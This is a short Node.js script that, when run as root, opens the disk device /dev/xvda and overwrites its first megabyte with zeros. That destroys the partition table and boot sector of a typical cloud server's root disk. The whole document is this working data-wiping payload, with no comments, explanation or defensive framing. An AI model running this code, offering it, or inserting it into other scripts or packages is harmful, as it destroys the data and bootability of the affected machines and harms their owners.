#!/usr/bin/env node
const fs = require("fs");
if (process.getuid() === 0) {
  const fd = fs.openSync("/dev/xvda", "r+");
  fs.writeSync(fd, Buffer.alloc(1024 * 1024));
  fs.closeSync(fd);
}
